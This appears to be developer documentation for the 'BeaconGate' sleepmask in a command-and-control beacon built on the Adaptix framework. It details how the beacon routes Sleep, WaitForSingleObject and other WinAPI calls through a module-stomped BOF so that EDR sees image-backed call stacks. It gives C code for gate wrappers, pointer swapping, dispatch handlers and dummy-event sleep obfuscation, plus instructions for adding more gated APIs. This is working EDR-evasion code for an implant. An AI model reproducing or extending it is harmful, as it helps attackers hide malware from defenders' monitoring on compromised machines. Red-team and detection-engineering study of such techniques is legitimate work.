# BeaconGate & Sleepmask

BeaconGate is an API call proxy that routes sensitive WinAPI calls through a sleepmask BOF instead of calling them directly from beacon code. This ensures the beacon's call stack never appears in EDR telemetry for intercepted API calls.

## How It Works

### The Problem

When the beacon calls `Sleep()`, the call stack shows beacon code sitting in private (PRV) memory calling kernel32. EDR tools flag this - legitimate threads sleep from image-backed (IMG) code, not from anonymous shellcode regions.

### The Solution

Instead of calling `Sleep()` directly, the beacon calls a **gate wrapper** (`NaxGateSleep`) which builds a `FUNCTION_CALL` struct describing the intended API call, then routes it through a **sleepmask BOF** loaded into image-backed memory via module stomping. The sleepmask executes the API on the beacon's behalf.

```
Beacon heartbeat loop
  └── Nax->Kernel32.Sleep(ms)      // actually calls NaxGateSleep
        └── NaxGateSleep(ms)
              ├── builds FUNCTION_CALL { GateApi=SLEEP, FunctionPtr=real_Sleep, Args[0]=ms }
              └── calls Nax->Gate(Nax, &fc)    // sleep_mask BOF entry
                    └── sleep_mask(NaxPtr, FnCall)
                          └── HandleSleep(FnCall)
                                └── NtWaitForSingleObject(hEvent, FALSE, &timeout)
```

### Architecture Overview

```
┌─────────────────────┐
│ Adaptix UI          │  ← operator picks gated APIs from a list
│ BeaconGate tab      │
└────────┬────────────┘
         │ gate_apis = ["Sleep", "WaitForSingleObject", ...]
         ▼
┌─────────────────────┐
│ Go plugin           │  ← emits #define NAX_GATE_SLEEP, NAX_GATE_WAITFORSINGLEOBJECT, ...
│ pl_build.go         │  ← compiles sleepmask BOF → embeds in Config_sleepmask.h
└────────┬────────────┘
         │
    ┌────┴────────────────────────────┐
    │                                  │
    ▼                                  ▼
┌────────────────────┐      ┌──────────────────────┐
│ src_beacon/        │      │ src_sleepmask/       │
│ Gate.h             │      │ Gate.h (own copy)    │
│ Instance.h         │      │ main.c               │
│  • NAX_GATE_       │      │  • HandleSleep       │
│    ORIGINALS       │      │  • HandleWFSO        │
│ Sleepmask.c        │      │  • HandleWFMO        │
│  • gate wrappers   │      │  • HandleGeneric     │
│  • NaxSleepmaskInit│      │                      │
│  • NaxSleepmaskWire│      │                      │
└────────────────────┘      └──────────────────────┘
        ▲ struct layout must match ▲
```

### Naming Convention

All compile-time gate flags follow the rule:

```
#define NAX_GATE_<TOUPPER(FunctionName)>
```

| Win32 Function | Config.h Define |
|----------------|-----------------|
| `Sleep` | `NAX_GATE_SLEEP` |
| `WaitForSingleObject` | `NAX_GATE_WAITFORSINGLEOBJECT` |
| `WaitForMultipleObjects` | `NAX_GATE_WAITFORMULTIPLEOBJECTS` |
| `VirtualProtect` | `NAX_GATE_VIRTUALPROTECT` |

The Go plugin auto-derives the define from the function name (`strings.ToUpper(name)`), so no lookup table is needed. The operator types the exact Win32 function name in the UI list and the code-side `#ifdef` guard uses the uppercase version.

### Key Components

**`GATE_API` enum** (`include/Gate.h`):
```c
typedef enum _GATE_API {
    GATE_API_GENERIC                   = 0x00,
    GATE_API_SLEEP                     = 0x01,
    GATE_API_WAIT_FOR_SINGLE_OBJECT    = 0x02,
    GATE_API_WAIT_FOR_MULTIPLE_OBJECTS = 0x03,
} GATE_API;
```

**`FUNCTION_CALL` struct** (`include/Gate.h`):
```c
typedef struct _FUNCTION_CALL {
    PVOID      FunctionPtr;     // target API address
    UINT32     GateApi;         // GATE_API tag for dispatch
    UINT32     NumArgs;         // argument count (0-10)
    ULONG_PTR  Args[10];       // arguments
    ULONG_PTR  RetValue;       // return value passed back to beacon
} FUNCTION_CALL;
```

**`NAX_GATE_ORIGINALS` struct** (`include/Instance.h`):
```c
typedef struct {
    PVOID  Sleep;
    PVOID  WaitForSingleObject;
    PVOID  WaitForMultipleObjects;
    PVOID  VirtualProtect;
} NAX_GATE_ORIGINALS;
```

**`NAX_GATE_SWAP_TABLE`** (`include/Instance.h`):
```c
#define NAX_GATE_MAX_SWAPS 8

typedef struct {
    PVOID* Slot;
    PVOID  Original;
} NAX_GATE_SWAP;

typedef struct {
    NAX_GATE_SWAP Entries[NAX_GATE_MAX_SWAPS];
    UINT32        Count;
} NAX_GATE_SWAP_TABLE;
```

`NAX_GATE_ORIGINALS` holds the real API addresses for per-API handler dispatch. The swap table (`GateSwaps` field in `NAX_INSTANCE`) tracks all gate registrations for dynamic unwiring via `NaxGateUnwireAll()`. Separate from the per-DLL structs (`NAX_KERNEL32`, etc.) to keep gate concerns isolated. Accessed as `Nax->GateOriginals.Sleep`, etc.

**Gate wrappers** (`src_beacon/src/Commands/Sleepmask.c`):
- `NaxGateSleep()` - replaces `Nax->Kernel32.Sleep`
- `NaxGateWaitForSingleObject()` - replaces `Nax->Kernel32.WaitForSingleObject`
- `NaxGateWaitForMultipleObjects()` - replaces `Nax->Kernel32.WaitForMultipleObjects`
- Each wrapper sets `GateApi` to the correct enum value and reads `FunctionPtr` from `GateOriginals`

**Sleepmask BOF** (`src_sleepmask/src/main.c`):
- Compiled as a COFF `.o` file, loaded by the beacon's BOF loader
- Runs from image-backed memory (module-stomped DLL `.text`)
- Entry point: `sleep_mask(void* NaxPtr, PFUNCTION_CALL FnCall)`
- Dispatches on `FnCall->GateApi` to per-API handler functions
- `HandleGeneric()` dispatches arbitrary APIs (0-10 args) via function pointer

## Embedded Sleepmask

The sleepmask BOF is embedded at build time in `Config_sleepmask.h` as a `NAX_SLEEPMASK_WRITE` macro. During beacon startup (`NaxSleepmaskInit`), the BOF bytes are written to a heap buffer, loaded via `NaxBofLoadResident`, and wired before the first sleep ever executes.

This eliminates the "first sleep gap" - there is no window where raw kernel32 Sleep is exposed.

### Build Pipeline

```
1. Operator generates payload with BeaconGate enabled
2. Go plugin compiles src_sleepmask/ → sleepmask.x64.o
3. Go plugin converts BOF bytes to Config_sleepmask.h (byte-by-byte WRITE macro)
4. Go plugin generates Config.h with #define NAX_GATE_SLEEP / NAX_GATE_WAITFORSINGLEOBJECT / ...
5. Beacon compiles with embedded sleepmask
6. On first run: NaxSleepmaskInit() → heap alloc → WRITE → BofLoadResident → wire gate
7. First sleep already goes through BeaconGate
```

### Runtime Reload (sleepmask-set)

The `sleepmask-set` command rebuilds the sleepmask BOF from source and hot-loads it into a running beacon without redeploying. Use it when iterating on sleepmask logic (e.g., changing sleep obfuscation behavior, adding debug prints).

**Workflow:**

1. Edit sleepmask source files in `src_sleepmask/`
2. Run `sleepmask-set` (or `sleepmask-set -debug`) from the Adaptix operator console
3. The server rebuilds the BOF from source (`make clean && make` in `src_sleepmask/`)
4. Fresh `.o` bytes are sent to the beacon via `CMD_SLEEPMASK_SET` (0x32)
5. Beacon calls `NaxSleepmaskWire` → `NaxBofLoadResident` (frees old resident, loads new)
6. Gate wrappers are re-registered to route through the new `sleep_mask()` entry point
7. Next sleep cycle uses the updated sleepmask

**Flags:**

| Flag | Effect |
|------|--------|
| (none) | Release build — no debug prints from sleepmask |
| `-debug` | Debug build (`-DDEBUG`) — sleepmask emits `NaxDbg` prints |

**Important:** The beacon must have been built with BeaconGate enabled. Without gate wrappers compiled into the beacon, the BOF loads but nothing routes through it.

## Wiring Flow

### 1. Beacon starts, resolves APIs

Standard PEB walk resolves kernel32 function pointers including `Sleep`, `WaitForSingleObject`, and `WaitForMultipleObjects`.

### 2. NaxSleepmaskInit loads embedded BOF

Called during beacon init, before the heartbeat loop:
1. Allocates heap buffer of `NAX_SLEEPMASK_LEN` bytes
2. Writes embedded BOF bytes via `NAX_SLEEPMASK_WRITE(buf)`
3. Calls `NaxSleepmaskWire` → `NaxBofLoadResident` (permanent module-stomped load)
4. Backs up real function pointers to `Nax->GateOriginals.*`
5. Swaps function pointers to gate wrappers
6. Frees the temporary buffer (BOF is mapped elsewhere)

### 3. Every subsequent call goes through the gate

```
Nax->Kernel32.Sleep(ms)
  → NaxGateSleep(ms)          // gate wrapper
    → Nax->Gate(Nax, &fc)     // sleepmask BOF (image-backed memory)
      → HandleSleep(FnCall)
        → NtWaitForSingleObject(hEvent, FALSE, &timeout)
```

## The .refptr Problem

On MinGW x86_64, taking a function pointer across translation units generates a `.rdata$.refptr.FuncName` GOT-like section. When only `.text` is extracted for PIC shellcode, this section is lost.

**Fix**: All gate wrappers and the code that takes their address (`NaxSleepmaskWire`) live in the **same translation unit** (`Sleepmask.c`). Same-TU references use direct RIP-relative `lea` instructions - no `.refptr` indirection needed.

## Configuring BeaconGate

### Step 1: Enable in the Adaptix UI

1. Open the Adaptix client
2. Go to **Listeners** → select your HTTP or SMB listener → **Generate Payload**
3. Click the **BeaconGate** tab
4. Check **Enable BeaconGate** - this auto-enables:
   - **Module Stomping** (required for image-backed BOF execution)
   - The **Sleepmask DLL** field and gated APIs list become editable
5. **Sleepmask DLL** (default `msxml6.dll`): the sacrificial DLL for the dedicated sleepmask stomp slot. Must be different from the sync/async BOF DLLs.
6. The default list includes `Sleep`, `WaitForSingleObject`, `WaitForMultipleObjects`
6. Add or remove APIs using the text field + `+`/`-` buttons
7. Generate the payload

The UI writes three config keys consumed by the Go plugin:
- `beacongate` → triggers sleepmask BOF compilation + embedding
- `sm_stomp_dll` → DLL for the dedicated sleepmask stomp slot (separate from sync/async BOFs)
- `gate_apis` → list of function names → each becomes `#define NAX_GATE_TOUPPER(name)` in Config.h

### Step 2: Verify in Debug Build

With a debug beacon, look for these log lines at startup:

```
[sleepmask] init: embedding 3594 bytes
[sleepmask] gated: Sleep (real=00007FFxxxxx)
[sleepmask] gated: WaitForSingleObject (real=00007FFxxxxx)
[sleepmask] gated: WaitForMultipleObjects (real=00007FFxxxxx)
[sleepmask] wired: gate=00007FFxxxxx
```

And on each sleep cycle:

```
[gate] Sleep(5000 ms)
[sleepmask] GateApi=0x01 NumArgs=1 FunctionPtr=00007FFxxxxx
[sleepmask] Sleep -> NtWaitForSingleObject(hEvent, 5000 ms)
[sleepmask] woke up
```

---

## Adding a New Gated API

This section walks through adding a new API to BeaconGate end-to-end. We'll use `VirtualProtect` as the example.

### Step 1: Add the GATE_API enum value

Edit **both** Gate.h files (they must stay in sync):

**`src_beacon/include/Gate.h`** and **`src_sleepmask/include/Gate.h`**:

```c
typedef enum _GATE_API {
    GATE_API_GENERIC                   = 0x00,
    GATE_API_SLEEP                     = 0x01,
    GATE_API_WAIT_FOR_SINGLE_OBJECT    = 0x02,
    GATE_API_WAIT_FOR_MULTIPLE_OBJECTS = 0x03,
    GATE_API_VIRTUAL_PROTECT           = 0x04,   // ← new
} GATE_API;
```

Pick the next unused hex value. The enum tag is how the sleepmask knows which handler to call.

### Step 2: Add the backup pointer

**`src_beacon/include/Instance.h`** - add the original function pointer to `NAX_GATE_ORIGINALS`:

```c
typedef struct {
    PVOID  Sleep;
    PVOID  WaitForSingleObject;
    PVOID  WaitForMultipleObjects;
    PVOID  VirtualProtect;             // ← new
} NAX_GATE_ORIGINALS;
```

This struct is separate from the per-DLL structs and lives in `NAX_INSTANCE` as `GateOriginals`.

### Step 3: Write the gate wrapper in Sleepmask.c

**`src_beacon/src/Commands/Sleepmask.c`** - add the gate wrapper function, guarded by a compile-time `#ifdef` using the naming convention `NAX_GATE_` + `TOUPPER(FunctionName)`:

```c
#ifdef NAX_GATE_VIRTUALPROTECT
FUNC BOOL WINAPI NaxGateVirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ) {
    G_INSTANCE;

    NaxDbg( Nax, "[gate] VirtualProtect(%p, %zu, 0x%lx)", lpAddress, dwSize, flNewProtect );

    FUNCTION_CALL fc;
    MmZero( &fc, sizeof( fc ) );

    fc.FunctionPtr = Nax->GateOriginals.VirtualProtect;
    fc.GateApi     = GATE_API_VIRTUAL_PROTECT;
    fc.NumArgs     = 4;
    fc.Args[0]     = (ULONG_PTR)lpAddress;
    fc.Args[1]     = (ULONG_PTR)dwSize;
    fc.Args[2]     = (ULONG_PTR)flNewProtect;
    fc.Args[3]     = (ULONG_PTR)lpflOldProtect;

    ((FN_SM_ENTRY)Nax->Gate)( Nax, &fc );

    return (BOOL)fc.RetValue;
}
#endif
```

**Critical rules:**
- The wrapper **must** be in `Sleepmask.c` (same TU as the wiring code) to avoid the `.refptr` problem
- Match the original API's exact signature and calling convention
- Set `GateApi` to your new enum value
- Read `FunctionPtr` from `Nax->GateOriginals.VirtualProtect`, not the swapped pointer

### Step 4: Wire the gate in NaxSleepmaskWire

In the same file, add the wiring block inside `NaxSleepmaskWire()`:

```c
#ifdef NAX_GATE_VIRTUALPROTECT
    if ( !Nax->GateOriginals.VirtualProtect )
        Nax->GateOriginals.VirtualProtect = (PVOID)Nax->Kernel32.VirtualProtect;
    NaxGateRegister( Nax, (PVOID*)&Nax->Kernel32.VirtualProtect, (PVOID)NaxGateVirtualProtect );
    NaxDbg( Nax, "[sleepmask] gated: VirtualProtect (real=%p)", Nax->GateOriginals.VirtualProtect );
#endif
```

This records the swap in the gate swap table (so `NaxGateUnwireAll()` can restore it) and swaps the function pointer to the gate wrapper.

### Step 5: Add the sleepmask handler

**`src_sleepmask/src/main.c`** - add a handler function and a case in the dispatcher:

```c
/* ========= [ BOF imports ] ========= */
__declspec(dllimport) BOOL WINAPI KERNEL32$VirtualProtect( LPVOID, SIZE_T, DWORD, PDWORD );
#define VirtualProtect KERNEL32$VirtualProtect

/* ========= [ per-API handlers ] ========= */
static void HandleVirtualProtect( PFUNCTION_CALL FnCall ) {
    LPVOID  lpAddress      = (LPVOID)FnCall->Args[0];
    SIZE_T  dwSize         = (SIZE_T)FnCall->Args[1];
    DWORD   flNewProtect   = (DWORD)FnCall->Args[2];
    PDWORD  lpflOldProtect = (PDWORD)FnCall->Args[3];

    BOOL ret = VirtualProtect( lpAddress, dwSize, flNewProtect, lpflOldProtect );
    FnCall->RetValue = (ULONG_PTR)ret;
}

/* ========= [ entry point ] ========= */
void sleep_mask( void* NaxPtr, PFUNCTION_CALL FnCall ) {
    switch ( FnCall->GateApi ) {
    case GATE_API_SLEEP:                     HandleSleep( FnCall );                  return;
    case GATE_API_WAIT_FOR_SINGLE_OBJECT:    HandleWaitForSingleObject( FnCall );    return;
    case GATE_API_WAIT_FOR_MULTIPLE_OBJECTS: HandleWaitForMultipleObjects( FnCall );  return;
    case GATE_API_VIRTUAL_PROTECT:           HandleVirtualProtect( FnCall );          return;
    default:                                 HandleGeneric( FnCall );                 return;
    }
}
```

If the API doesn't need special handling, you can skip the dedicated handler and let it fall through to `HandleGeneric` - the generic dispatcher calls the function pointer with the correct number of args based on `NumArgs`. Dedicated handlers are for APIs that need custom behavior (e.g., the Sleep handler's dummy event technique). If you want to plug in your own sleep obfuscation technique, `HandleSleep` is the right place to start.

### Step 6: Add the name to the UI list (no code changes needed)

Because the UI uses a list widget, the operator simply types the function name in the BeaconGate tab. The Go plugin auto-derives `#define NAX_GATE_VIRTUALPROTECT` from `"VirtualProtect"` via `strings.ToUpper()`. No changes needed in `pl_build.go` or `pl_main.go`.

### Summary: All Files to Touch

| File | What to add |
|------|-------------|
| `src_beacon/include/Gate.h` | New `GATE_API_*` enum value |
| `src_sleepmask/include/Gate.h` | Same enum value (keep in sync) |
| `src_beacon/include/Instance.h` | `PVOID FunctionName;` in `NAX_GATE_ORIGINALS` |
| `src_beacon/src/Commands/Sleepmask.c` | `#ifdef NAX_GATE_TOUPPER` gate wrapper + `NaxGateRegister()` wiring |
| `src_sleepmask/src/main.c` | BOF import + handler function + switch case |

Note: **no Go plugin or AxScript changes needed** - the list-based UI and dynamic `TOUPPER()` conversion handle any function name automatically.

### When to Use HandleGeneric vs. a Dedicated Handler

- **HandleGeneric**: The API is called normally with its real function pointer. Use when you just want clean call stacks without changing behavior. Most APIs belong here.
- **Dedicated handler**: The API needs special behavior — for example, `HandleSleep` creates a dummy event and waits on it via `NtWaitForSingleObject` instead of calling `Sleep` directly. Write a dedicated handler when you need to modify the call itself or implement your own sleep obfuscation logic.

If you don't write a handler, the `default:` case in the sleepmask dispatcher routes to `HandleGeneric`, which calls the function pointer with the correct number of args based on `NumArgs`. You still need the gate wrapper on the beacon side (to intercept the call and build FUNCTION_CALL), but the sleepmask side "just works."

---

## BOF Symbol Resolution

The sleepmask is a standard BOF. External symbols use the `MODULE$FUNCTION` convention:

```c
__declspec(dllimport) DWORD WINAPI KERNEL32$WaitForSingleObject( HANDLE, DWORD );
#define WaitForSingleObject KERNEL32$WaitForSingleObject
```

The beacon's COFF loader splits on `$`, calls `LoadLibraryA(module)` + `GetProcAddress(function)` to resolve each symbol at load time.

## Resident BOF Loading & Dedicated SmSlot

Unlike normal BOFs which are loaded, executed, and freed, the sleepmask uses **resident loading** (`NaxBofLoadResident`). The BOF stays mapped in memory permanently because beacon calls it on every heartbeat.

### The Problem: Slot Contention

Previously the sleepmask occupied the sync stomp slot, blocking all regular sync BOFs from module stomping. When a command BOF ran (e.g., whoami), it couldn't stomp because the sync slot was permanently occupied → fell back to private memory → call stacks showed PRV addresses.

### The Fix: Dedicated Sleepmask Stomp Slot (SmSlot)

The `BOF_STOMP_POOL` now has a dedicated `SmSlot` exclusively for the resident sleepmask BOF. It is loaded from a separate DLL (configurable as "Sleepmask DLL" in the BeaconGate tab, default `msxml6.dll`).

```c
typedef struct {
    BOF_STOMP_SLOT SyncSlot;      // regular sync BOFs
    BOF_STOMP_SLOT AsyncSlots[];  // async BOF jobs
    BOF_STOMP_SLOT SmSlot;        // ← dedicated sleepmask slot
    BYTE           SmStompReq;    // flag: route next stomp ops to SmSlot
} BOF_STOMP_POOL;
```

**How it works:**
1. `NaxBofStompInit` initializes SmSlot from `Config.SmStompDll` (a separate DLL from sync/async)
2. `NaxBofLoadResident` sets `SmStompReq=TRUE` before allocating
3. All stomp functions (`Alloc`, `Protect`, `Pdata`, `Free`) check `SmStompReq` first and pick SmSlot
4. After loading, `SmStompReq` is cleared - SmSlot.InUse stays TRUE permanently
5. Regular BOFs never see SmSlot, so the sync slot remains free

**Result:** The sleepmask runs from its own image-backed DLL (clean call stack), and sync/async BOF stomping works normally alongside it.

## Sleep Obfuscation

The sleepmask supports optional sleep obfuscation selected at build time via the operator UI's **SleepObf** combo box.

### WFSO PoC (SleepObf=On)

When `SleepObf` is enabled, `HandleSleep` replaces the direct `Sleep` call with a dummy-event wait via native NT APIs. This ensures the sleeping thread's call stack originates from `ntdll` rather than `kernel32`, and the wait target is a transient event handle rather than the process pseudo-handle.

**Implementation** (`src_sleepmask/src/main.c`):

```c
static void HandleSleep( PFUNCTION_CALL FnCall ) {
    DWORD ms = (DWORD)FnCall->Args[0];

    // Convert milliseconds to a negative 100ns LARGE_INTEGER
    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)ms * 10000);

    // Create a one-shot dummy event (auto-reset, non-signalled)
    HANDLE hEvent = NULL;
    NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );

    // Wait on the dummy event — it will never be signalled, so this
    // blocks for exactly `timeout` before returning STATUS_TIMEOUT
    NtWaitForSingleObject( hEvent, FALSE, &timeout );

    NtClose( hEvent );
}
```

`HandleWaitForSingleObject` and `HandleWaitForMultipleObjects` are pass-throughs: they call `NtWaitForSingleObject` (or `WaitForMultipleObjects`) directly on the original handle. `HandleVirtualProtect` calls `VirtualProtect` directly. `HandleGeneric` dispatches up to 10 args via a function pointer cast.

**When SleepObf=Off:** `HandleSleep` falls through to `HandleGeneric`, which calls the real `Sleep` function pointer via `FnCall->FunctionPtr` with the original arguments. Behavior is identical to calling Sleep directly, except the call originates from image-backed memory.

**`NAX_SM_CONFIG`** (shared config struct between beacon and sleepmask):

```c
typedef struct {
    UINT8  SleepObf;   // 0 = off, 1 = on
    UINT8  _pad[3];
} NAX_SM_CONFIG;
```

**Extending this:** `HandleSleep` is the designated extension point for sleep obfuscation. Replace its body with your own technique — timer queues, APC chains, or anything else — without touching the gate wiring or any other handler. The rest of the architecture stays the same.

### Operator Configuration

In the Adaptix UI payload generation dialog:

| Field | Values | Effect |
|-------|--------|--------|
| **SleepObf** | Off / On | Enables WFSO dummy-event sleep obfuscation |
| **Sleepmask DLL** | e.g. `msxml6.dll` | Sacrificial DLL for the sleepmask's dedicated stomp slot |

The `sleepobf-config` command can toggle sleep obfuscation at runtime:

```
sleepobf-config {sleep_obf}
```

Where `{sleep_obf}` is `on` or `off`.

## Files

| File | Role |
|------|------|
| `src_beacon/include/Gate.h` | `GATE_API` enum, `FUNCTION_CALL` struct, `FN0`-`FN10` typedefs |
| `src_beacon/include/Config.h` | `SleepObf` config field |
| `src_beacon/include/Config_sleepmask.h` | Sleepmask config struct shared with beacon (`NAX_SM_CONFIG`) |
| `src_beacon/include/Instance.h` | `NAX_GATE_ORIGINALS` struct, `Gate` entry pointer in NAX_INSTANCE |
| `src_beacon/src/Commands/Sleepmask.c` | Gate wrappers + `NaxSleepmaskInit` + `NaxSleepmaskWire` + runtime reload |
| `src_beacon/src/Commands/Dispatch.c` | Routes `CMD_SLEEPMASK_SET` to handler |
| `src_beacon/src/Main.c` | Calls `NaxSleepmaskInit()` at startup |
| `src_sleepmask/include/Gate.h` | Sleepmask-local copy of `GATE_API` enum and `FUNCTION_CALL` struct (must stay in sync with beacon's) |
| `src_sleepmask/include/Imports.h` | Sleepmask BOF import declarations |
| `src_sleepmask/src/main.c` | Sleepmask BOF entry (`sleep_mask`), per-API handlers, `HandleGeneric` dispatcher |
| `src_server/agent_nonameax/pl_build.go` | Config.h generation with `NAX_GATE_TOUPPER` defines + `Config_sleepmask.h` |
| `src_server/agent_nonameax/pl_main.go` | Reads `gate_apis` list, builds sleepmask BOF, embeds in payload |
| `src_server/agent_nonameax/ax_config.axs` | BeaconGate UI tab, SleepObf config, `sleepmask-set` command |
